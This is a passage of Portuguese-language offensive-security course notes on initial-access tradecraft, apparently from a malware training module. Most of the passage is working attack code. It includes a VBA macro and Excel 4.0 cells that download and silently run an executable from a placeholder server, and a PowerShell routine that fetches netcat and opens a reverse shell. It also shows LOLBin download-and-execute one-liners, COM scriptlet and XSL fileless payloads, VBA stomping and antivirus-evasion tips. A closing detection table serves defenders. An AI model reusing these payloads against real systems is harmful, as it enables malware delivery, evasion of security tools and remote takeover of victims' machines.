copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe %temp%\sophia.exe
```

O LNK aponta para `%temp%\sophia.exe` — EDRs que detectam por nome de processo não disparam.

**MITRE:** T1059.001 (PowerShell), T1204.002 (user execution)

---

#### Macro VBA em Documento Office

```vba
' Declara API Windows URLDownloadToFile da urlmon.dll
Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias _
    "URLDownloadToFileA" (ByVal pCaller As Long, _
    ByVal szURL As String, _
    ByVal szFileName As String, _
    ByVal dwReserved As Long, _
    ByVal lpfnCB As Long) As Long

Sub DocuSign()
    dwn = URLDownloadToFile(0, "https://seuservidor.com/update.exe", _
        Environ("APPDATA") & "\WindowsUpdate.exe", 0, 0)
    Shell Environ("APPDATA") & "\WindowsUpdate.exe", vbHide
End Sub

' Auto-executa quando documento é aberto
Private Sub Document_Open()
    DocuSign
End Sub
```

**Engenharia social para habilitar macros:** template visual de "modo de compatibilidade" falso com botão "Habilitar Conteúdo".

---

#### VBA Stomping

Arquivos `.doc` armazenam código VBA em dois formatos:
1. **Código-fonte VBA** (texto legível, escaneado por AV)
2. **P-code** (bytecode compilado, não escaneado da mesma forma)

O stomping substitui o código-fonte por código benigno, mantendo o p-code malicioso original.

```bash
# Ferramenta: Adaptive Document Builder (adb)
python internals\stomp_vba.py C:\users\h\desktop\out\Incorrect_Payment_7457.doc
```

AV escaneia código limpo, mas o p-code malicioso original executa ao abrir no Word.

**MITRE:** T1564.007 (VBA Stomping)

---

#### Excel 4.0 Macros (XLM)

Funcionalidade legada do Excel (1992) ainda suportada. Macros em células da planilha com melhor evasão que VBA em alguns cenários:

```
Célula A1: =CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,
           "https://seuservidor.com/payload.exe",
           "C:\Users\Public\update.exe",0,0)

Célula A2: =CALL("Shell32","ShellExecuteA","JJCCCJJ",0,
           "open","C:\Users\Public\update.exe",0,0)

Célula A3: =HALT()
```

- Nomear célula `Auto_Open` → executa automaticamente ao abrir o arquivo
- Ocultar planilha com macros em "Very Hidden"

---

#### PowerShell: Download e Execução

```powershell
# Download via WebClient para %APPDATA%
$WebFile = "https://onedrive.live.com/download?cid=350765A9B8676AF7..."
(New-Object System.Net.WebClient).DownloadFile($WebFile, "$env:APPDATA\nc.exe")

# Execução oculta
Start-Process -FilePath "$env:comspec" `
    -ArgumentList "/c $env:APPDATA\nc.exe localhost 4444 -e cmd.exe" `
    -WindowStyle hidden
```

**AMSI (Antimalware Scan Interface):** Windows hookeia `amsi.dll` para escanear scripts PowerShell em memória antes da execução. Bypass de AMSI é pré-requisito para muitos ataques modernos.

---

#### LOLBins (Living Off the Land Binaries)

Binários legítimos da Microsoft usados maliciosamente. Referência: https://lolbas-project.github.io/

```cmd
# certutil para download
certutil.exe -urlcache -split -f https://seuservidor.com/nc.exe nc.exe

# bitsadmin para download em background
bitsadmin /transfer job /download /priority high https://seuservidor.com/p.exe C:\Public\p.exe

# mshta para executar HTA remoto
mshta.exe https://seuservidor.com/payload.hta
```

**Detecção:** LOLBins ficaram tão comuns que EDRs modernos têm assinaturas específicas. Técnica de "arms race" permanente.

---

#### COM Objects e COM Scriptlets

COM (Component Object Model) permite comunicação entre componentes Windows. COM Scriptlets (`.sct`) executam JScript ou VBScript em memória.

**Estrutura de COM Scriptlet:**

```xml
<?XML version="1.0"?>
<scriptlet>
<registration
  Description="Scriptlet"
  ProgID="Scriptlet.Malware"
  Version="1.00"
  ClassID="{3ac6e5c0-9f18-11d1-83d1-f49604c10000}">

  <script language="JScript">
  <![CDATA[
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("powershell.exe -w hidden -EncodedCommand ...");
  ]]>
  </script>
</registration>
</scriptlet>
```

**Download dinâmico via COM (fileless):**

```javascript
// Baixa e executa script adicional direto em memória (sem tocar disco)
net = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
net.Open("GET", "http://seuservidor.com/malware.js", false);
net.Send();
js = net.ResponseText;
// executa o script baixado em memória via avaliação dinâmica
```

**Execução via regsvr32.exe (LOLBin):**

```cmd
regsvr32 /s /n /u /i:http://seuservidor.com/payload.sct C:\Windows\system32\scrobj.dll
```

**Execução via rundll32.exe + HTA:**

```cmd
rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://127.0.0.1:8080/calc.sct").Exec();
```

**Evasão:** copiar `regsvr32.exe` e `scrobj.dll` para `%temp%` com nomes diferentes antes de usar.

**C# via COM (DotNetToJScript):** serializa objeto .NET em XML e carrega via COM. Permite carregar backdoor C# completo via scriptlet.

```cmd
# Compilar DLL .NET
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe \
    /reference:"System.Management.Automation.dll" \
    /reference:System.IO.Compression.dll /target:library pshell.cs

# Converter para JScript
DotNetToJScript.exe -o pshell.js -v v4 pshell.dll
```

Ferramenta: https://github.com/tyranid/DotNetToJScript

---

#### XSL Stylesheets Fileless

XSL Stylesheets podem embutir scripts e carregar via wmic sem escrever no disco:

```cmd
wmic os get /format:"https://seuservidor.com/malware.xsl"
```

Binário `wmic.exe` é LOLBin assinado pela Microsoft. O XSL pode conter JScript ou VBScript.

**MITRE:** T1220 (XSL Script Processing)

---

### Supply Chain e Drive-By Download

**Supply Chain (T1195):** inserir código malicioso em software legítimo antes de chegar ao usuário.
- SolarWinds Sunburst: backdoor no update do Orion → ~18.000 organizações
- CCleaner: versão trojanizada pelo canal oficial
- 3CX: VoIP trojanizado na cadeia de build

**Watering Hole (T1189):** comprometer sites que os alvos frequentam.
1. Identificar fórum/site frequentado pelo grupo-alvo
2. Comprometer o site e inserir exploit de browser
3. Visitantes com browser desatualizado são comprometidos automaticamente
4. Mais furtivo que spearphishing — nenhum email suspeito para reportar

---

### Tabela de Detecção por Técnica

| Técnica | Indicadores | Ferramenta de Detecção |
|---------|-------------|----------------------|
| LNK malicioso | LNK → cmd/powershell com argumentos longos | Sysmon Event ID 1 |
| VBA Macro | Document_Open com URLDownloadToFile | AMSI + Office ATP |
| Excel 4.0 macro | Auto_Open em planilha Very Hidden | Defender for Endpoint |
| Evilginx | Domínio novo + cert LE + proxy behavior | Conditional Access (Azure AD) |
| COM Scriptlet | regsvr32.exe /i:http:// | Sysmon + EDR |
| PowerShell download | WebClient + URLs externas | ScriptBlock Logging + AMSI |
| wmic XSL | wmic + /format:http | Process command line monitoring |

---

### Referências MalTrak Módulos 02 e 03

- GoPhish: https://github.com/gophish/gophish
- Evilginx 2: https://github.com/kgretzky/evilginx2
- LOLBAS Project: https://lolbas-project.github.io/
- DotNetToJScript: https://github.com/tyranid/DotNetToJScript
- Adaptive Document Builder: https://github.com/Synacktiv/adb
- T1566 Phishing: https://attack.mitre.org/techniques/T1566/
- T1220 XSL Script Processing: https://attack.mitre.org/techniques/T1220/
- T1195 Supply Chain: https://attack.mitre.org/techniques/T1195/
